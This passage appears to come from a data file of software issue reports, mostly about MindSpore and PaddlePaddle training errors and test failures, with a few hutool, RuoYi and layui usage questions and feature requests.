/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py(573)/ x_n, hx_n = self._stacked_dynamic_rnn(x, hx, seq_length)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/src/gnmt_model/dynamic_rnn.py(84)/ output, (hn, cn) = self.lstm(x, (init_h, init_c))/ In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/src/gnmt_model/dynamic_rnn.py(126)/ out, state_h, state_c = self.net(inputs, init_h, init_c)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/src/gnmt_model/encoder.py(90)/ encoder_outputs, _ = self.encoder_layers[2](bi_encoder_outputs)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/src/gnmt_model/gnmt.py(132)/ encoder_outputs = self.gnmt_encoder(inputs)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/src/gnmt_model/gnmt_for_train.py(95)/ decoder_outputs = self.gnmt(source_ids, source_mask, target_ids)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/src/gnmt_model/gnmt_for_train.py(178)/ prediction_scores = self.gnmt(source_ids, source_mask, target_ids)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/src/gnmt_model/gnmt_for_train.py(259)/ loss = self.network(source_ids,/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py(107)/ return self.network(*outputs)/"
add indexes attribute for metrics,"Task Use this template for task tracking kind/task Task Description Currently, the calculates metrics by two values: logits and labels. When users define a eval_network with multiple outputs and pass it to the Model for evaluation, users need to specify the positions of logits and labels in outputs through of Model, or need to customize one of their own metrics which is not easy to use. And the eval_indexes of Model is a little confusing. Add a attribute for metrics module and optimize the following scenarios. user scenario Define a eval network with four outputs, and compute accuracy with first and third output. better implementation This scenario would be much easier if the Metric provided a index property and get logits/labels through this index. Backend Ascend/GPU/CPU Targets Add indexes for all appropriate metrics in module of mindspore.nn.metrics Perform necessary check and report errors   <code>: nn.metrics eval_indexes indexes import mindspore.nn as nn # custom eval network class CustomWithEvalCell(nn.Cell): def __init__(self, network): super(CustomWithEvalCell, self).__init__(auto_prefix=False) def construct(self, data1, data2, label1, label2): logits1, logits2 = self._network(data1, data2) return logits1, logits2，label1, label2 # define forward network and evaluation network net = Net() eval_network = CustomWithEvalCell(net) # 1. define eval_indexes to compute accuracy with first and third output. model = Model(..., eval_network=eval_network, eval_indexes=[1, 0, 2], metrics={'acc'}) # or metrics={'accuracy': nn.Accuracy()} # eval_indexes means [loss_positon_in_outputs, logits_position_in_outputs, labels_position_in_outputs], then the first(outputs[eval_indexes[1]]) and third(outputs[eval_indexes[2]]) output will be used to update accuracy, the second value will be used to get loss(outputs[eval_indexes[0]]) if 'loss' is defined in `metrics` set of `Model`. # The above approach is not easy. # 2. define custom accuracy, and do not set the `eval_indexes`. # custom accuracy, the inputs is the outputs of evaluation network, so we should use inputs[0] and inputs[2] to update metrics. class CustomAccuracy(nn.Metric): def __init__(self, eval_type='classification'): super(CustomAccuracy, self).__init__(eval_type) pass def update(self, *inputs): y_pred = inputs[0] y_label = inputs[2] pass # use CustomAccuracy and eval_indexes can be empty model = Model(..., eval_network=eval_network, metrics={'accuracy': CustomAccuracy()} # A example for modifing the nn.Accuracy class Accuracy(nn.Metric): def __init__(self, eval_type='classification', indexes=[0, 1]): super(CustomAccuracy, self).__init__(eval_type) self.indexes = indexes pass def update(self, *inputs): y_pred = inputs[self.indexes[0]] y_label = inputs[self.indexes[1]] pass model = Model(..., eval_network=eval_network, metrics={'accuracy': nn.Accuracy(indexes=[0, 2])})"
为Excel指定单元格为时间类型,"JDK版本： openjdk_8_241 hutool版本： 5.5.7 我想给日期的单元格设置成时间格式的，并没有生效，不知道这样写法有没有问题   <code>: DataFormat format = writer.getWorkbook().createDataFormat(); CellStyle style1 = writer.createCellStyle(3,1); CellStyle style2 = writer.createCellStyle(4,1); CellStyle style3 = writer.createCellStyle(5,1); CellStyle style4 = writer.createCellStyle(3,2); CellStyle style5 = writer.createCellStyle(4,2); CellStyle style6 = writer.createCellStyle(5,2); style1.setDataFormat(format.getFormat(""yyyy-MM-dd"")); style2.setDataFormat(format.getFormat(""yyyy-MM-dd"")); style3.setDataFormat(format.getFormat(""yyyy-MM-dd"")); style4.setDataFormat(format.getFormat(""yyyy-MM-dd"")); style5.setDataFormat(format.getFormat(""yyyy-MM-dd"")); style6.setDataFormat(format.getFormat(""yyyy-MM-dd""));"
 [新功能] 采用代理拦截设计打造网络请求组件,自动处理参数   <code>: Sql
cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encountered,"多GPU训练的时候提示错误： 问题的具体表现形式是： 多卡训练的时候，指定大batch，不太容易出现以上的错误，小batch很容易出现 单卡的时候不出现这个问题 神经网络很简单，就是一个600000 * 256的fc layer。 trainer_config: dataprovider:   <code>: F0221 14:00:17.320631 17204 hl_cuda_device.cc:566] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encountered F0221 14:00:17.320631 17206 hl_cuda_device.cc:566] Check failed: cudaSuccess == cudaStat (0 vs. 77) Cuda Error: an illegal memory access was encountered *** Check failure stack trace: *** @ 0x9ea800 google::LogMessage::Fail() @ 0x9ea800 google::LogMessage::Fail() @ 0x9ea75c google::LogMessage::SendToLog() @ 0x9ea75c google::LogMessage::SendToLog() @ 0x9ea0e0 google::LogMessage::Flush() @ 0x9ea0e0 google::LogMessage::Flush() @ 0x9ed187 google::LogMessageFatal::~LogMessageFatal() @ 0x9ed187 google::LogMessageFatal::~LogMessageFatal() @ 0x9b4437 hl_stream_synchronize() @ 0x9b4437 hl_stream_synchronize() @ 0x9c1007 hl_matrix_csr_mul_dense() @ 0x61c79b paddle::TrainerThread::valueDispatchThread() @ 0x7c6cc7 paddle::GpuMatrix::mul() @ 0x7ca5af paddle::GpuMatrix::mul() @ 0x6fa234 paddle::FullyConnectedLayer::forward() @ 0x6411a4 paddle::NeuralNetwork::forward() @ 0x7f60239508a0 execute_native_thread_routine @ 0x61d161 paddle::TrainerThread::forward() @ 0x61e35c paddle::TrainerThread::computeThread() @ 0x7f60248371c3 start_thread @ 0x7f60239508a0 execute_native_thread_routine @ 0x7f60230c112d __clone @ 0x7f60248371c3 start_thread @ (nil) (unknown) unit_word = data_layer(name='unit_words', size=word_dict_len) rec_word = data_layer(name='recword', size=word_dict_len) labels = data_layer(name='label', size=2) unit_word_embedding = fc_layer(input = unit_word, size = 256, act = IdentityActivation(), bias_attr = False, param_attr = ParamAttr(name='_source_language_embedding', initial_mean=0, initial_std=0.01,sparse_update=True)) rec_word_embedding = fc_layer(input = rec_word, size = 256, act = IdentityActivation(), bias_attr = False, param_attr=ParamAttr(name='_source_language_embedding', initial_mean=0,initial_std=0.01,sparse_update=True)) output_embedding = fc_layer(input = [unit_word_embedding, rec_word_embedding], size = 256, act = TanhActivation(), bias_attr = True) output_embedding2 = fc_layer(input = output_embedding, size = 64, act = TanhActivation(), bias_attr = True) final_output = fc_layer(input = output_embedding2, size = 2, act = SoftmaxActivation(), bias_attr = True) cost = cross_entropy(input=final_output, label=labels) def hook(settings, word_dict, **kwargs): settings.word_dict = word_dict settings.line_idx = 0 #all inputs are integral and sequential type settings.slots = [ sparse_vector(len(word_dict)), sparse_binary_vector(len(word_dict)), integer_value(2) ]"
重复提交是否存在无法拦截的疑问。,"关于重提提交拦截校验的处理，有个疑问，如果同时发来多个请求，第一个请求在redis.setCacheObject之前第2个请求已经进行了redisCache.getCacheObject查询，这样是不是就拦截不到重复提交了呀。一下是源码SameUrlDataInterceptor类中的代码片段。烦请解答下，谢谢。 // 唯一值（没有消息头则使用请求地址） String submitKey = request.getHeader(header); if (StringUtils.isEmpty(submitKey)) { submitKey = url; }   <code>: // 唯一标识（指定key + 消息头） String cache_repeat_key = Constants.REPEAT_SUBMIT_KEY + submitKey; Object sessionObj = redisCache.getCacheObject(cache_repeat_key); if (sessionObj != null) { Map&lt;String, Object&gt; sessionMap = (Map&lt;String, Object&gt;) sessionObj; if (sessionMap.containsKey(url)) { Map&lt;String, Object&gt; preDataMap = (Map&lt;String, Object&gt;) sessionMap.get(url); if (compareParams(nowDataMap, preDataMap) &amp;&amp; compareTime(nowDataMap, preDataMap)) { return true; } } } Map&lt;String, Object&gt; cacheMap = new HashMap&lt;String, Object&gt;(); cacheMap.put(url, nowDataMap); redisCache.setCacheObject(cache_repeat_key, cacheMap, intervalTime, TimeUnit.SECONDS); return false;"
建议 ZipUtil、CompressUtil 支持 strip-components,JDK版本： openjdk_8_201 hutool版本： 5.8.10 建议 ZipUtil、CompressUtil 支持 strip-components 参数来支持自动清除压缩包里面的文件夹名 如   <code>: tar -zxf jdk.tar.gz --strip-components 1 -C /opt/java/
如何在树表中按某个或某些条件隐藏radio,"如：我想按parentId为0时隐藏radio，以便用户不能选择操作。代码如下，但没有效果   <code>: columns: [{ field: 'selectItem', radio: true ,formatter: function(value, row, index){ if (row.parentId == 0){ this.radio = false; return ; } this.radio = true return ; } },"
"[CT][MS][OCCM][diag] 算子在ascend上出现ValueError: For Diag, rank of input should be less than 5, but got: 5","算子在ascend上 运行用例test_diag_input_5d 出现报错 def test_diag_input_5d(): input_shape = (4, 8, 16, 8, 4) fact = DiagFactory(input_shape) test_diag.py:181: ../share/ops/primitive/diag_ops.py:94: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/diag_ops.py:31: in forward_mindspore_impl out = net(self.input) ../share/utils.py:199: in call out = super().call(*args, **kwargs) /root/archiconda3/envs/nisong3.74/lib/python3.7/site-packages/mindspore/nn/cell.py:625: in call out = self.compile_and_run(*args) /root/archiconda3/envs/nisong3.74/lib/python3.7/site-packages/mindspore/nn/cell.py:944: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/nisong3.74/lib/python3.7/site-packages/mindspore/nn/cell.py:918: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff8f5e77d0&gt;, obj = WrapOp&lt;&gt; phase = 'train.1668184217830394112.281472322233360.14', do_convert = True, jit_config_dict = {} args = (Tensor(shape=[4, 8, 16, 8, 4], dtype=Float32, value= [[[[[-1.24433994e+00, -3.84039164e-01, -1.14121640e+00, 2.61311...+00, 1.73582482e+00, 4.66620266e-01], [ 8.55081081e-01, -1.80953014e+00, -1.19776130e+00, 3.74182135e-01]]]]]),) E ValueError: For Diag, rank of input should be less than 5, but got: 5 E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/optimizer/ir_fission/diag_fission.cc:107 Process /root/archiconda3/envs/nisong3.74/lib/python3.7/site-packages/mindspore/common/api.py:1383: ValueError test_diag.py::test_diag_input_6d FAILED   <code>: fact.forward_cmp() def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode())"
动态表格如何手动取消选中,"我想取消选中 上面代码能在静态表格中取消选中 但是在动态表格中无效   <code>: $('tbody input').eq(1).prop('checked',true); layui.form.render()"
[MS][用户接口-AtLeast1D]AtLeast1D has RuntimeError on Graph mode,"operator has RuntimeErroron Graph mode / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_nn_atleast1d_inputs_dtype_complex64_partial_error_1、test_nn_atleast1d_inputs_dtype_complex64_partial_error_3、test_nn_atleast1d_inputs_dtype_complex128_partial_error_1、test_nn_atleast1d_inputs_dtype_complex128_partial_error_3 def test_nn_atleast1d_inputs_dtype_complex128_partial_error_1(): x1 = Tensor((np.random.randn(2, 3) + np.random.randn(2, 3) * 1j).astype(np.complex128)) x2 = Tensor(np.array((np.random.randn() + np.random.randn() * 1j)).astype(np.complex128)) x3 = Tensor((np.random.randn(5) + np.random.randn(5) * 1j).astype(np.complex128)) input_list = [x1, x2, x3] fact = AtLeast1DMock(inputs=input_list) test_atleast1d.py:306: ../share/ops/nn/atleast1d_ops.py:126: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/nn/atleast1d_ops.py:110: in forward_mindspore_impl output = net(*self.inputs) ../share/utils.py:199: in call out = super().call(*args, **kwargs) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:627: in call out = self.compile_and_run(*args) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/common/api.py:1402: in call return self.run(obj, *args, phase=phase) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/common/api.py:1439: in run return self._exec_pip(obj, *args, phase=phase_real) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/common/api.py:98: in wrapper results = fn(*arg, **kwargs) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff7ad2b0d0&gt;, obj = WrapOp&lt;&gt;, phase = 'train.1671431157785160448.281470909731280.17' args = (Tensor(shape=[2, 3], dtype=Complex128, value= [[-1.84152-0.835052j, 0.019216+0.291037j, 0.261272+0.0549665j], [1.515...mplex128, value= [-1.25606+0.39673j, -1.36542+0.903585j, -0.416361+0.0495594j, -0.653807+1.48027j, 0.639844+0.43233j])) fn = &lt;bound method AtLeast1DNet.construct of WrapOp&lt;&gt;&gt; E RuntimeError: Run task for graph:kernel_graph_12 error! The details refer to 'Ascend Error Message'. E E ---------------------------------------------------- E - Ascend Error Message: E ---------------------------------------------------- E E39999: Inner Error! E E39999 An exception occurred during AICPU execution, stream_id:2, task_id:2, errcode:2, msg:execute kernel inner error.[FUNC:ProcessAicpuErrorInfo][FILE:device_error_proc.cc][LINE:669] E Aicpu kernel execute failed, device_id=5, stream_id=2, task_id=2.[FUNC:PrintAicpuErrorInfo][FILE:task.cc][LINE:773] E Aicpu kernel execute failed, device_id=5, stream_id=2, task_id=2, fault op_name=[FUNC:GetError][FILE:stream.cc][LINE:921] E rtStreamSynchronize execute failed, reason=[the model stream execute failed][FUNC:FuncErrorReason][FILE:error_message_manage.cc][LINE:49] E Solution: Please contact support engineer. E E (Please search ""Ascend Error Message"" at https://www.mindspore.cn for error code description) E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_executor.cc:240 RunGraph /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/common/api.py:1421: RuntimeError pass   <code>: fact.forward_cmp() @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct obj.__parse_method__ = fn.__name__ return self._graph_executor(args, phase)"
[MS][net][CPM]hccl error after train over,": /device ascend : -- MindSpore version : commit_id__ = ''[sha1]:e7ea93da,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_cpm_finetune_32p train cpm with 32 card hccl error no error log cpm 多机训练结束后hccl报错   <code>: [ERROR] HCCP(62162,python):2021-06-25-06:48:17.484.935 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.485.010 [adapter.cc:651][hccl-62162-3-1624414122-16-7418518143159551237][15][Dereg][RaMr]errNo[0x0000000005000013] ra mr dereg fail. return[228102], params: handle[0xfff130002a40], addr[0x108852916800], size[0], access[0] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.485.121 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.485.143 [adapter.cc:651][hccl-62162-3-1624414122-16-7418518143159551237][15][Dereg][RaMr]errNo[0x0000000005000013] ra mr dereg fail. return[228102], params: handle[0xfff130002a40], addr[0x1088297c2200], size[0], access[0] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.485.245 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.485.264 [adapter.cc:651][hccl-62162-3-1624414122-16-7418518143159551237][15][Dereg][RaMr]errNo[0x0000000005000013] ra mr dereg fail. return[228102], params: handle[0xfff130002a40], addr[0x108040203000], size[0], access[0] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.485.378 [ra_hdc.c:659]tid:66826,ra_hdc_qp_destroy(659) : [destroy][ra_hdc_qp]hdc_send_recv_pkt failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.485.401 [adapter.cc:595][hccl-62162-3-1624414122-16-7418518143159551237][15][Destroy][RaQp]errNo[0x0000000005000013] ra qp destroy fail. return[228102], params: handle[0xfff130002a40] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.485.507 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.485.530 [adapter.cc:651][hccl-62162-3-1624414122-16-7418518143159551237][15][Dereg][RaMr]errNo[0x0000000005000013] ra mr dereg fail. return[228102], params: handle[0xfff134002a40], addr[0x108852916800], size[0], access[0] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.485.628 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.485.650 [adapter.cc:651][hccl-62162-3-1624414122-16-7418518143159551237][15][Dereg][RaMr]errNo[0x0000000005000013] ra mr dereg fail. return[228102], params: handle[0xfff134002a40], addr[0x1088297c2200], size[0], access[0] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.485.759 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.485.780 [adapter.cc:651][hccl-62162-3-1624414122-16-7418518143159551237][15][Dereg][RaMr]errNo[0x0000000005000013] ra mr dereg fail. return[228102], params: handle[0xfff134002a40], addr[0x108040202000], size[0], access[0] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.485.991 [ra_hdc.c:659]tid:66826,ra_hdc_qp_destroy(659) : [destroy][ra_hdc_qp]hdc_send_recv_pkt failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.486.010 [adapter.cc:595][hccl-62162-3-1624414122-16-7418518143159551237][15][Destroy][RaQp]errNo[0x0000000005000013] ra qp destroy fail. return[228102], params: handle[0xfff134002a40] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.487.040 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3) [ERROR] HCCL(62162,python):2021-06-25-06:48:17.487.070 [adapter.cc:651][hccl-62162-3-1624414122-16-7418518143159551237][15][Dereg][RaMr]errNo[0x0000000005000013] ra mr dereg fail. return[228102], params: handle[0xfff138575160], addr[0x108855cd8c00], size[0], access[0] [ERROR] HCCP(62162,python):2021-06-25-06:48:17.487.205 [ra_hdc.c:743]tid:66826,ra_hdc_mr_dereg(743) : [dereg][ra_hdc_mr]ra hdc message process failed ret(-19) phy_id(3)"
fluid.io.save_inference_model  The target variable must have an associated operator that generates it.,"cost, prediction = network.rank_model() fluid.io.save_inference_model(save_dirname, [var.name for var in modelvars[0:5]], [prediction], train_exe) Traceback (most recent call last): File ""train_fc.py"", line 216, in train(is_local=True) File ""train_fc.py"", line 190, in train train_loop(fluid.default_main_program()) File ""train_fc.py"", line 164, in train_loop [prediction], train_exe) File ""/home/work/liuyaping/paddle/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/io.py"", line 649, in save_inference_model main_program = main_program._prune(targets=target_vars) File ""/home/work/liuyaping/paddle/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 1739, in _prune ""The target variable must have an "" ValueError: The target variable must have an associated operator that generates it.   <code>: left_score = fluid.layers.fc(input=fc_pos_hid1, size=1, act=""sigmoid"", param_attr=hid_para_attr, bias_attr=hid_bias_attr) # The cosine similarity score of source and right target. fc_neg_hid1 = fluid.layers.concat(input=[fc_img] +fc_hid0[5:8], axis=1) right_score = fluid.layers.fc(input=fc_neg_hid1, size=1, act=""sigmoid"", param_attr=hid_para_attr, bias_attr=hid_bias_attr) cost = fluid.layers.rank_loss(label, left_score, right_score) # but this operator is not supported currently. # so AUC will not used. return cost, left_score"
Compilation Failures and Exceptions Cannot Be Captured in the pynative Mode of the D Environment,": device ascend + pynative模式 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_conv2dtranspose_padmode_wrong_mode test_conv2dtranspose_stride_wrong_h test_cumprod_axis_2 test_dynamicrnn_cell_clip_2_neg test_dynamicrnn_cell_depth_error_value test_dynamicrnn_forget_bias_1_neg_2 test_dynamicrnn_keep_prob_2_neg test_dynamicrnn_num_proj_1_2 test_dynamicrnn_time_major_false test_dynamicrnn_use_peephole_true pytest -s test_conv2dtranspose.py pytest -s test_cumprod.py pytest -s test_dynamicrnn.py D环境pynative模式部分用例出现编译失败和异常捕获不到 用例执行结果成功   <code>: def test_conv2dtranspose_padmode_wrong_mode(): pad_mode = ""hello"" with pytest.raises(ValueError): &gt; Conv2dTranspose(in_channels=3, out_channels=64, kernel_size=7, pad_mode=pad_mode) ../operations/test_conv2dtranspose.py:665: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/utils.py:119: in __init__ super().__init__(*args, **kwargs) ../share/ops/nn/conv2dtranspose_ops.py:17: in __init__ padding, dilation, group, has_bias, weight_init, bias_init) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/layer/conv.py:976: in __init__ transposed=True) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/layer/conv.py:94: in __init__ self.weight = Parameter(initializer(self.weight_init, shape), name='weight') /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/parameter.py:116: in __new__ input_class, *class_init_args = Parameter._get_parameter_new_args(default_input) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/parameter.py:196: in _get_parameter_new_args data = data.init_data().asnumpy() /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/tensor.py:1263: in init_data self.init(arr) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/initializer.py:61: in __call__ return self._initialize(arr) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/initializer.py:448: in _initialize output_data = output_tensor.asnumpy() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = Tensor(shape=[3, 64, 7, 7], dtype=Float32, value= [[[[-1.38069820e+00, 6.41283467e-02, -3.43720317e-01 ... 8.9187479...e-01], [-1.32280719e-02, 1.94058865e-01, 4.95476872e-01 ... -2.03941178e+00, 5.72312891e-01, 1.22760642e+00]]]]) def asnumpy(self): """"""Convert tensor to numpy array."""""" self.init_check() &gt; PynativeExecutor_.get_instance().execute_all_task() E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/ascend_kernel_compile.cc:374 ParseTargetJobStatus] Single op compile failed def test_conv2dtranspose_stride_wrong_h(): input_np = np.random.randn(32, 3, 224, 224).astype(np.float32) stride = 225 net = Conv2dTranspose(in_channels=3, out_channels=64, kernel_size=7, stride=stride) fact = AnyNetFactory(net=net) with pytest.raises((RuntimeError, ValueError)) as e: &gt; fact(Tensor(input_np)) E Failed: DID NOT RAISE (&lt;class 'RuntimeError'&gt;, &lt;class 'ValueError'&gt;) def test_cumprod_axis_2(): inputa = np.array([2, 3, 4]).astype(np.int32) net = CumProd(exclusive=False, reverse=False, axis=2) fact = AnyNetFactory(net=net) with pytest.raises(RuntimeError): &gt; fact(Tensor(inputa)) E Failed: DID NOT RAISE &lt;class 'RuntimeError'&gt; def test_dynamicrnn_forget_bias_1_neg_2(forget_bias): num_step = 3 batch_size = 32 input_size = 16 hidden_size = 32 x = Tensor(np.random.randn(num_step, batch_size, input_size).astype(np.float16)) init_h = Tensor(np.random.randn(1, batch_size, hidden_size).astype(np.float16)) init_c = Tensor(np.random.randn(1, batch_size, hidden_size).astype(np.float16)) fact = DynamicRNNMock( attributes={'cell_type': 'LSTM', 'direction': 'UNIDIRECTIONAL', 'cell_depth': 1, 'use_peephole': False, 'keep_prob': 1.0, 'cell_clip': -1.0, 'num_proj': 0, 'time_major': True, 'activation': 'tanh', 'forget_bias': forget_bias, &gt; 'is_training': True, 'seq_l': None}, inputs=[x, init_h, init_c]) ../operations/test_dynamicrnn.py:546: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/dynamicrnn_ops.py:56: in __init__ self.x_np = inputs[0].asnumpy() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = Tensor(shape=[3, 32, 16], dtype=Float16, value= [[[ 7.9541e-01, -4.7388e-01, 4.4897e-01 ... -2.1204e-01, -5.8838e-01,...e-02, 1.0566e+00, 4.0112e-01], [-9.6484e-01, -8.4326e-01, 1.0127e+00 ... 1.9160e+00, -6.2012e-01, -6.2402e-01]]]) def asnumpy(self): """"""Convert tensor to numpy array."""""" self.init_check() &gt; PynativeExecutor_.get_instance().execute_all_task() E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/ascend_kernel_compile.cc:374 ParseTargetJobStatus] Single op compile failed"
error links in READMEs of ModelZoo,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Check links in READMEs of ModelZoo. For details about the error link information, see the file. Fix the error links.   <code>: error_link.xlsx"
可以定只限定类型的`数据域`,【发现问题版本】：3.5.7 【问题描述】：定义时，如果取消选择，如下图所示： 则当在具体数据表的字段中，使用该时，修改时，不要将字段的选择好的为   <code>: 数据域 长度 数据域 长度 数据域 ---请选择---
"[CT][MS][OCCM][SparseApplyAdagradDA] Some inputs of SparseApplyAdagradDA must be parameters, but while run pass when input is tensor.","Some inputs of SparseApplyAdagradDA must be parameters, but while run pass when input is tensor Some inputs of SparseApplyAdagradDA must be parameters, but while run pass when input is tensor 优化器算子输入必须为parameters，如果输入为tensor应该需要报错 / 硬件环境: /device /GPU/ : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: def test_p_sparseapplyadagradda_grad_square_accum_not_parameter(): var = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) grad_accum = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) grad_square_accum = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) lr = Tensor(np.random.random(), dtype=mstype.float16) l1 = Tensor(np.random.random(), dtype=mstype.float16) l2 = Tensor(np.random.random(), dtype=mstype.float16) grad = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) indices = Tensor(np.random.uniform(0, 2, 